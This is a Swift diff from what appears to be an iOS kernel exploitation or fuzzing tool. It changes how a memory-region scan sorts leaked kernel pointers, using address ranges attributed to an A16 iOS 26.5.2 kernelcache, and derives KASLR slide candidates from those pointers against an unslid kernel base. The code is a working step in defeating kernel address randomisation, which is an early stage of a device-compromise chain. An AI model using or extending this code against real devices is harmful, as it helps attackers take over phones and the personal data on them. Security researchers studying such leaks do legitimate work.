@@ -1870,23 +1870,21 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
                     for b in 0..<8 { val |= UInt64(scratch[qw*8 + b]) << (b*8) }
                     guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
 
-                    // Classify with strict KTEXT heuristics:
-                    // Real ARM64 kernel text pointers must be 4-byte aligned (low 2 bits == 0)
-                    // and must not be single-byte-fill patterns (RGBA / shader data).
-                    // Giant regions (> 256KB) almost certainly contain shader/framebuffer data,
-                    // not embedded kernel pointers — skip KTEXT classification there.
+                    // Kernelcache parse confirmed iOS 26.5.2 A16 VA layout:
+                    //   KTEXT  0xFFFFFFF000000000 – 0xFFFFFFF07FFFFFFF  (slid kernel code)
+                    //   KHEAP  0xFFFFFE0000000000 – 0xFFFFFEFFFFFFFFFF  (kernel heap/data)
+                    //   KMMIO  0xFFFFFFF080000000+                       (IOKit HW regs, fixed)
                     let lowBitsAligned = (val & 3) == 0
                     let b0v = UInt8(val & 0xFF)
                     let isFillPattern = (val == UInt64(b0v) &* 0x0101010101010101)
-                    let regionIsSmall = size <= 0x40000  // ≤ 256 KB
 
                     let cat: String
-                    if val < 0xFFFFFE0100000000 && lowBitsAligned && !isFillPattern && regionIsSmall {
+                    if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && lowBitsAligned && !isFillPattern {
                         cat = "KTEXT"; rKTEXT += 1; cKTEXT += 1
                         if ktextSamples.count < 30 {
                             ktextSamples.append((region: UInt(addr), offset: qw*8, val: val))
                         }
-                    } else if val < 0xFFFFFF0000000000 {
+                    } else if val < 0xFFFFFFF000000000 {
                         cat = "KHEAP"; rKHEAP += 1; cKHEAP += 1
                     } else {
                         cat = "KMMIO"; rKMMIO += 1; cKMMIO += 1
@@ -1924,15 +1922,15 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
         if !repeats.isEmpty {
             step("STABLE REFS (ptr seen ≥3×):")
             for (val, cnt) in repeats.prefix(8) {
-                let cat = val < 0xFFFFFE0100000000 ? "KTEXT" : (val < 0xFFFFFF0000000000 ? "KHEAP" : "KMMIO")
+                let cat = (val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000) ? "KTEXT" : (val < 0xFFFFFFF000000000 ? "KHEAP" : "KMMIO")
                 step("  0x\(String(val,radix:16)) × \(cnt) [\(cat)]")
             }
         }
 
-        // KASLR attempt — unslid kernel base on A16 iOS = 0xFFFFFE0007004000
+        // KASLR: unslid __TEXT base from kernelcache.release.iphone15b = 0xFFFFFFF007004000
         if !ktextSamples.isEmpty {
             step("KASLR CANDIDATES (\(ktextSamples.count) KTEXT ptrs found):")
-            let unslid: UInt64 = 0xFFFFFE0007004000
+            let unslid: UInt64 = 0xFFFFFFF007004000
             for s in ktextSamples.prefix(10) {
                 let slide = s.val &- unslid
                 step("  0x\(String(s.val,radix:16)) @ +0x\(String(s.offset,radix:16)) → slide~0x\(String(slide,radix:16))")
